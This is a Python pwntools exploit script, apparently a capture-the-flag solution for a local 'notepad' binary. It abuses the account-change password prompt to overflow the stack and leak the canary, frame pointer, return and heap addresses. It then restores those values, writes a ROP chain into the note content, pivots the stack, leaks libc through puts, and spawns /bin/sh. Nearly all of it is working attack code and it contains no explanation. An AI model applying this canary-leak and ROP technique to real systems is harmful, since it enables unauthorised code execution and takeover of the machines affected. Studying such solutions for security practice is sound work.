from pwn import *

#p = process("./notepad")
p = remote("localhost", 7882)

#context.log_level = 'debug'

# Constants
garbage8 = b"A" * 8
garbage16 = b"A" * 16
garbage24 = b"A" * 24
garbage32 = b"A" * 32

# Login default Account, guest
p.sendlineafter(b"[+] Please enter your name:\n", b"guest")
p.sendlineafter(b"[+] Please enter your password:\n", b"guest")

# Select Chage Account => Leak code address (Return Address)
p.sendlineafter(b"Please choose an option:\n", "2")

## 1. Leak CANARY
p.sendafter(b"[+] Which account do you want to change?:\n", garbage8)
p.sendafter(b"[+] Password:\n", garbage8 + b"A")
p.recvuntil(b"user ")
CANARY = u64(b"\x00" + p.recvuntil(b". Please try again.\n")[17:24])
log.info(f"CANARY: {hex(CANARY)}")

## 2. Leak SFP
p.sendafter(b"[+] Which account do you want to change?:\n", garbage8)
p.sendafter(b"[+] Password:\n", garbage16)
p.recvuntil(b"user ")
SFP = u64(p.recvuntil(b". Please try again.\n")[24:-len(". Please try again.\n")].ljust(8, b"\x00"))
log.info(f"SFP: {hex(SFP)}")

## 3. Leak Return Address
p.sendafter(b"[+] Which account do you want to change?:\n", garbage8)
p.sendafter(b"[+] Password:\n", garbage24)
p.recvuntil(b"user ")
returnAddr = u64(p.recvuntil(b". Please try again.\n")[32:-len(". Please try again.\n")].ljust(8, b"\x00"))
log.info(f"Return Address: {hex(returnAddr)}")
mainAddr = returnAddr - 825
log.info(f"main Address: {hex(mainAddr)}")

## 4. Restore SFP
p.sendafter(b"[+] Which account do you want to change?:\n", garbage8)
p.sendafter(b"[+] Password:\n", garbage16 + p64(SFP))

## 5. Restore CANARY
p.sendafter(b"[+] Which account do you want to change?:\n", garbage8)
p.sendafter(b"[+] Password:\n", garbage8 + p64(CANARY))

# Select Chage Account => Leak content Address
p.sendlineafter(b"Please choose an option:\n", "2")

## Leak CANARY : CANARY is consistent

## Leak SFP : SFP is same as the previous one (increase, decrease with same amount)

## Leak Return Address : I Already leaked

## 1. Leak content Address
p.sendafter(b"[+] Which account do you want to change?:\n", garbage8)
p.sendafter(b"[+] Password:\n", garbage32)
p.recvuntil(b"user ")
contentAddr = u64(p.recvuntil(b". Please try again.\n")[40:-len(". Please try again.\n")].ljust(8, b"\x00"))
log.info(f"content Address: {hex(contentAddr)}")

## 2. Restore RIP
p.sendafter(b"[+] Which account do you want to change?:\n", garbage8)
p.sendafter(b"[+] Password:\n", garbage24 + p64(returnAddr))

## 3. Restore SFP
p.sendafter(b"[+] Which account do you want to change?:\n", garbage8)
p.sendafter(b"[+] Password:\n", garbage16 + p64(SFP))

## 4. Restore CANARY
p.sendafter(b"[+] Which account do you want to change?:\n", garbage8)
p.sendafter(b"[+] Password:\n", garbage8 + p64(CANARY))

## 5. Pass last change
p.sendlineafter(b"[+] Which account do you want to change?:\n", "guest")
p.sendlineafter(b"[+] Password:\n", "guest")

# Make ROP Payload
## 1. Get symbol addresses
binary = ELF("./notepad")
base = mainAddr - binary.symbols['main']
log.info(f"base: {hex(base)}")

puts = binary.symbols['puts'] + base
log.info(f"puts: {hex(puts)}")

read = binary.symbols['read'] + base
log.info(f"read: {hex(read)}")

## 2. Get ROP Gadget address
pop_rdi_rsi_rdx = 0x1311 + base
log.info(f"pop rdi; pop rsi; pop rdx; ret: {hex(pop_rdi_rsi_rdx)}")

pop_rdi = 0x1320 + base
log.info(f"pop rdi; ret: {hex(pop_rdi)}")

## 3. Make ROP Payload
payloadlst = []

payloadlst.append(p64(pop_rdi))                     # 0x08
payloadlst.append(p64(binary.got['puts'] + base))   # 0x10, rdi

payloadlst.append(p64(puts))                        # 0x18, puts

payloadlst.append(p64(pop_rdi_rsi_rdx))             # 0x20
payloadlst.append(p64(0))                           # 0x28, rdi
payloadlst.append(p64(contentAddr + 0x50))          # 0x30, rsi (stdin)
payloadlst.append(p64(16))                          # 0x38, rdx (Read Length)

payloadlst.append(p64(read))                        # 0x40, read

payloadlst.append(p64(pop_rdi))                     # 0x48
payloadlst.append(p64(contentAddr))                 # 0x50, rdi (contentAddr), address of "/bin/sh" will be stored here

payloadlst.append(p64(puts))                        # 0x58, address of system will be stored here

payload = p64(contentAddr + 8)

for pa in payloadlst:
    payload += pa

# Write ROP Payload to content
p.sendlineafter(b"Please choose an option:\n", "5")
p.sendlineafter(b"[+] Write Note content with in 100 bytes:\n", payload)

# Change Account and Stack Pivoting
p.sendlineafter(b"Please choose an option:\n", "2")

## 1. Overwrite Return Address to leave; ret;
leave_ret = 0x19a0 + base
p.sendafter(b"[+] Which account do you want to change?:\n", garbage8)
p.sendafter(b"[+] Password:\n", garbage24 + p64(leave_ret))

## 2. Overwrite SFP
p.sendafter(b"[+] Which account do you want to change?:\n", garbage8)
p.sendafter(b"[+] Password:\n", garbage16 + p64(contentAddr))# + len(payload) - 8))

## 3. Rewrite CANARY
p.sendafter(b"[+] Which account do you want to change?:\n", garbage8)
p.sendafter(b"[+] Password:\n", garbage8 + p64(CANARY))

## 4.5. Pass
p.sendlineafter(b"[+] Which account do you want to change?:\n", b"a")
p.sendlineafter(b"[+] Password:\n", b"a")

p.sendlineafter(b"[+] Which account do you want to change?:\n", b"a")
p.sendlineafter(b"[+] Password:\n", b"a")

# Get output and calculate libc base
libc = ELF("./libc.so.6")

p.recvuntil(b"[-] Change Account Failed.\n")
puts_got = u64(p.recv(6).ljust(8, b"\x00"))
log.info(f"puts_got: {hex(puts_got)}")

libc_base = puts_got - libc.symbols['puts']
log.info(f"libc_base: {hex(libc_base)}")

system = libc_base + libc.symbols['system']
log.info(f"system: {hex(system)}")

binsh = libc_base + next(libc.search(b"/bin/sh"))
log.info(f"/bin/sh: {hex(binsh)}")

# Send system and "/bin/sh" address to content
p.send(p64(binsh) + p64(system))

p.interactive()
